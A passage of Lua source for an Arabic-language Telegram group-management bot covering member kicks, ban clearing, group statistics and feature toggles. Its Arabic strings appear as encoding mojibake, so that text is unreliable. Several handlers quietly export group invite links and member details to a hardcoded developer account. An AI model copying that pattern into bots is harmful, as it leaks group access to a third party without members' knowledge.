Pin(msg.chat_id_,PinId,0)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุงุนุงุฏุฉ ุชุซุจูุช ุงูุฑุณุงูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุทุฑุฏ ุงููุญุฐูููู' and ChCheck(msg) or text == 'ูุณุญ ุงููุญุฐูููู' and ChCheck(msg) or text == 'ุทุฑุฏ ุงูุญุณุงุจุงุช ุงููุญุฐููู' and ChCheck(msg) or text == 'ุญุฐู ุงููุญุฐูููู' and ChCheck(msg) then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุทุฑุฏ ุงููุญุฐูููู")  
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ูุณุญ ุงููุญุธูุฑูู$") or text and text:match("^ุญุฐู ุงููุญุธูุฑูู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงููุทุฑูุฏูู$") or text and text:match("^ุญุฐู ุงููุทุฑูุฏูู$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Rio(msg.chat_id_, msg.id_, 0,'โ๏ธฐ*ูุง ููุฌุฏ ูุญุธูุฑูู*', 1, 'md')
DevRio:del(Rinda..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevRio:del(Rinda..'Rio:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุญุธูุฑูู")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ูุนูููุงุช ุงููุฌููุนู$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงูุงุนุถุงุก$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงููุฑูุจ$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงูุงุฏูููู$") and ChCheck(msg) or text and text:match("^ุนุฏุฏ ุงููุญุธูุฑูู$") and ChCheck(msg) then
local Muted = DevRio:scard(Rinda.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู โข โจ '..dp.title_..' โฉ\nโ๏ธฐุงูุงูุฏู โข โจ '..msg.chat_id_..' โฉ\nโ๏ธฐุนุฏุฏ ุงูุงุนุถุงุก โข โจ *'..data.member_count_..'* โฉ\nโ๏ธฐุนุฏุฏ ุงูุงุฏูููู โข โจ *'..data.administrator_count_..'* โฉ\nโ๏ธฐุนุฏุฏ ุงููุทุฑูุฏูู โข โจ *'..data.kicked_count_..'* โฉ\nโ๏ธฐุนุฏุฏ ุงูููุชูููู โข โจ *'..Muted..'* โฉ\nโ๏ธฐุนุฏุฏ ุฑุณุงุฆู ุงููุฌููุนู โข โจ *'..(msg.id_/2097152/0.5)..'* โฉ\n-----------------------------------------\n', 1, 'md') 
end,nil)
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match('^ูุดู (-%d+)') and ChCheck(msg) then
local ChatId = text:match('ูุดู (-%d+)') 
if not SudoBot(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุทูุฑูู ููุท', 1, 'md')
else
local ConstructorList = DevRio:scard(Rinda.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(Rinda.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(Rinda.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(Rinda.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(Rinda.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(Rinda.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(Rinda.."Rio:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/Source_Rinda' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Rio) 
if Rio.first_name_ ~= false then
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "Source_Rinda")..")"
else 
ConstructorRio = "ุญุณุงุจ ูุญุฐูู"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงููุฌููุนู โข ["..dp.title_.."]("..LinkGroup..")\nโ๏ธฐุงูุงูุฏู โข ( `"..ChatId.."` )\nโ๏ธฐุงูููุดุฆ โข "..ConstructorRio.."\nโ๏ธฐุนุฏุฏ ุงููุฏุฑุงุก โข ( *"..ManagerList.."* )\nโ๏ธฐุนุฏุฏ ุงูููุดุฆูู โข ( *"..ConstructorList.."* )\nโ๏ธฐุนุฏุฏ ุงูุงุฏูููู โข ( *"..AdminsList.."* )\nโ๏ธฐุนุฏุฏ ุงููููุฒูู โข ( *"..VipList.."* )\nโ๏ธฐุนุฏุฏ ุงููุญุธูุฑูู โข ( *"..BanedList.."* )\nโ๏ธฐุนุฏุฏ ุงููููุฏูู โข ( *"..TkeedList.."* )\nโ๏ธฐุนุฏุฏ ุงูููุชูููู โข ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูู ุชุชู ุงุถุงูุชู ุจูุง ูุงููู ุจูุดููุง", 1, "md")
end
end,nil)
end,nil)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุชุนูู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") and SecondSudo(msg) or text and text:match("^ุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") and SecondSudo(msg) then
local Num = text:match("ุชุนูู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$") or text:match("ุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก (%d+)$")
DevRio:set(Rinda..'Rio:Num:Add:Bot',Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ูุถุน ุนุฏุฏ ุงูุงุนุถุงุก โข *'..Num..'* ุนุถู', 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชูุนูู ุงูุจูุช ุงูุฎุฏูู' and ChCheck(msg) or text == 'โข ุชูุนูู ุงูุจูุช ุงูุฎุฏูู โ' and ChCheck(msg) then 
if not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช', 1, 'md')
else 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุจูุช ุงูุฎุฏูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:FreeBot'..Rinda) 
end 
end
if text == 'ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู' and ChCheck(msg) or text == 'โข ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู โ' and ChCheck(msg) then 
if not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช', 1, 'md')
else 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุจูุช ุงูุฎุฏูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:FreeBot'..Rinda,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'ุชุนุทูู ุตูุฑุชู' and Manager(msg) and ChCheck(msg) then   
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุตูุฑุชู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'ุชูุนูู ุตูุฑุชู' and Manager(msg) and ChCheck(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุตูุฑุชู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'ุชูุนูู ุงูุงูุนุงุจ' and Manager(msg) and ChCheck(msg) or text == 'ุชูุนูู ุงููุนุจู' and Manager(msg) and ChCheck(msg) then   
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงูุนุงุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'ุชุนุทูู ุงูุงูุนุงุจ' and Manager(msg) and ChCheck(msg) or text == 'ุชุนุทูู ุงููุนุจู' and Manager(msg) and ChCheck(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงูุนุงุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Games'..msg.chat_id_,true)  
end
if text == 'ุชูุนูู ุงูุงูุนุงุจ ุงููุชุทูุฑู' and Manager(msg) and ChCheck(msg) or text == 'ุชูุนูู ุงูุงูุนุงุจ ุงูุงุญุชุฑุงููู' and Manager(msg) and ChCheck(msg) then   
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงูุนุงุจ ุงููุชุทูุฑู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
if text == 'ุชุนุทูู ุงูุงูุนุงุจ ุงููุชุทูุฑู' and Manager(msg) and ChCheck(msg) or text == 'ุชุนุทูู ุงูุงูุนุงุจ ุงูุงุญุชุฑุงููู' and Manager(msg) and ChCheck(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงูุนุงุจ ุงููุชุทูุฑู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Gamesinline'..msg.chat_id_,true)  
end
if text == "ุชูุนูู ุงูุฑุงุจุท" and ChCheck(msg) or text == "ุชูุนูู ุฌูุจ ุงูุฑุงุจุท" and ChCheck(msg) then 
if Admin(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุฌูุจ ุฑุงุจุท ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "ุชุนุทูู ุงูุฑุงุจุท" and ChCheck(msg) or text == "ุชุนุทูู ุฌูุจ ุงูุฑุงุจุท" and ChCheck(msg) then 
if Admin(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุฌูุจ ุฑุงุจุท ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text == "ุชุนุทูู ุงูุฑุงุจุท ุงููุงูู" and ChCheck(msg) or text == "ุชุนุทูู ุฌูุจ ุงูุฑุงุจุท ุงููุงูู" and ChCheck(msg) then 
if Admin(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุฌูุจ ุฑุงุจุท ุงููุงูู ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
if text == "ุชูุนูู ุงูุฑุงุจุท ุงููุงูู" and ChCheck(msg) or text == "ุชูุนูู ุฌูุจ ุงูุฑุงุจุท ุงููุงูู" and ChCheck(msg) then 
if Admin(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุฌูุจ ุฑุงุจุท ุงููุงูู ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
if text and (text == "ุชูุนูู ุญุฐู ุงูุฑุฏูุฏ" or text == "ุชูุนูู ูุณุญ ุงูุฑุฏูุฏ") and ChCheck(msg) then 
if not RioConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููุงูู ุงููุฌููุนู ุงู ุงุนูู ููุท ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
if text and (text == "ุชุนุทูู ุญุฐู ุงูุฑุฏูุฏ" or text == "ุชุนุทูู ูุณุญ ุงูุฑุฏูุฏ") and ChCheck(msg) then 
if not RioConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููุงูู ุงููุฌููุนู ุงู ุงุนูู ููุท ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
if text and (text == "ุชูุนูู ุงุถู ุฑุฏ" or text == "ุชูุนูู ุงุถุงูู ุฑุฏ" or text == "ุชูุนูู ุญุฐู ุฑุฏ" or text == "ุชูุนูู ุญุฐู ุฑุฏ ุนุงู" or text == "ุชูุนูู ุงุถู ุฑุฏ ุนุงู") and ChCheck(msg) then 
if not RioConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููุงูู ุงููุฌููุนู ุงู ุงุนูู ููุท ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงุถู ุฑุฏ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
if text and (text == "ุชุนุทูู ุงุถู ุฑุฏ" or text == "ุชุนุทูู ุงุถุงูู ุฑุฏ" or text == "ุชุนุทูู ุญุฐู ุฑุฏ" or text == "ุชุนุทูู ุญุฐู ุฑุฏ ุนุงู" or text == "ุชุนุทูู ุงุถู ุฑุฏ ุนุงู") and ChCheck(msg) then 
if not RioConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููุงูู ุงููุฌููุนู ุงู ุงุนูู ููุท ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงุถู ุฑุฏ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match('^ุชูุนูู$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู ุนุงุฏูู ูููุณุช ุฎุงุฑูู ูุง ุชุณุชุทูุน ุชูุนููู ูุฑุฌู ุงู ุชุถุน ุณุฌู ุฑุณุงุฆู ุงููุฌููุนู ุถุงูุฑ ูููุณ ูุฎูู ููู ุจุนุฏูุง ููููู ุฑูุนู ุงุฏูู ุซู ุชูุนููู', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevRio:get(Rinda..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู ุงูู ูู โข *'..(DevRio:get(Rinda..'Rio:Num:Add:Bot') or 0)..'* ุนุถู', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,rio) 
local admins = rio.members_
for i=0 , #admins do
if rio.members_[i].bot_info_ == false and rio.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if rio.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevRio:sadd(Rinda.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(Rinda.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Rinda.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(Rinda.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Rinda..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู ุจุงูุชุงููุฏ ููุนูู', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธฐุชูุนู ุงููุฌููุนู "..dp.title_)  
DevRio:sadd(Rinda.."Rio:Groups",msg.chat_id_)
if not DevRio:get(Rinda..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(Rinda..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(Rinda..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
DevRio:set(Rinda.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"โ๏ธฐุชูุนู ูุฌููุนู ุฌุฏูุฏู โขโฏ\n-----------------------------------------\nโ๏ธฐุงูุถููุ โข "..Name.."\nโ๏ธฐุงุณู ุงููุฌููุนู โข ["..NameChat.."]\nโ๏ธฐุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู โข โจ *"..NumMem.."* โฉ\nโ๏ธฐุงูุฏู ุงููุฌููุนู โขโฏ\nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธฐุฑุงุจุท ุงููุฌููุนู โข โค\nโจ ["..LinkGroup.."] โฉ\n-----------------------------------------\nโ๏ธฐุงูููุช โข "..os.date("%I:%M%p").."\nโ๏ธฐุงูุชุงุฑูุฎ โข "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'ุชุนุทูู' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(Rinda..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุฌููุนู ุจุงูุชุงููุฏ ูุนุทูู', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธฐุชุนุทู ุงููุฌููุนู "..dp.title_)  
DevRio:srem(Rinda.."Rio:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
DevRio:set(Rinda.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"โ๏ธฐุชุนุทู ูุฌููุนู ุฌุฏูุฏู โขโฏ\n-----------------------------------------\nโ๏ธฐุงูุถููุ โข "..Name.."\nโ๏ธฐุงุณู ุงููุฌููุนู โข ["..NameChat.."]\nโ๏ธฐุงูุฏู ุงููุฌููุนู โขโฏ\nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธฐุฑุงุจุท ุงููุฌููุนู โข โค\nโจ ["..LinkGroup.."] โฉ\n-----------------------------------------\nโ๏ธฐุงูููุช โข "..os.date("%I:%M%p").."\nโ๏ธฐุงูุชุงุฑูุฎ โข "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุงููุทูุฑ$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "โ๏ธฐุฑุงุจุท ุงููุฌููุนู โข โค\nโจ ["..LinkGroup.."] โฉ"
else
LinkGroup = 'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงูุฏุนูู ููุฐู ุงููุฌููุนู !'
end
if not Sudo(msg) then
SendText(DevId,"โ๏ธฐููุงู ูู ุจุญุงุฌู ุงูู ูุณุงุนุฏู โขโฏ\n-----------------------------------------\nโ๏ธฐุงูุดุฎุต โข "..Name.."\nโ๏ธฐุงุณู ุงููุฌููุนู โข ["..NameChat.."]\nโ๏ธฐุงูุฏู ุงููุฌููุนู โขโฏ\nโจ `"..msg.chat_id_.."` โฉ\n"..LinkGroup.."\n-----------------------------------------\nโ๏ธฐุงูููุช โข "..os.date("%I:%M%p").."\nโ๏ธฐุงูุชุงุฑูุฎ โข "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุฑูุงุจุท ุงููุฑูุจุงุช' or text == 'ุฑูุงุจุท ุงููุฌููุนุงุช' or text == 'โข ุฑูุงุจุท ุงููุฌููุนุงุช โ' then
if not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
local List = DevRio:smembers(Rinda.."Rio:Groups")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชูุฌุฏ ูุฌููุนุงุช ููุนูู', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุฌุงุฑู ุงุฑุณุงู ูุณุฎู ุชุญุชูู ุนูู โข '..#List..' ูุฌููุนู', 1, 'md')
local Text = "โ๏ธฐ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ\nโ๏ธฐFile Bot Groups\n-----------------------------------------\n"
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(Rinda.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(Rinda.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(Rinda.."Rio:Groups:Links" ..v)
Text = Text..k.." โฌโฏ\nโ๏ธฐGroup ID โฌ "..v.."\nโ๏ธฐGroup Link โฌ "..(Groupslink or "Not Found").."\nโ๏ธฐGroup Managers โฌ "..GroupsManagers.."\nโ๏ธฐGroup Admins โฌ "..GroupsAdmins.."\n-----------------------------------------\n"
end
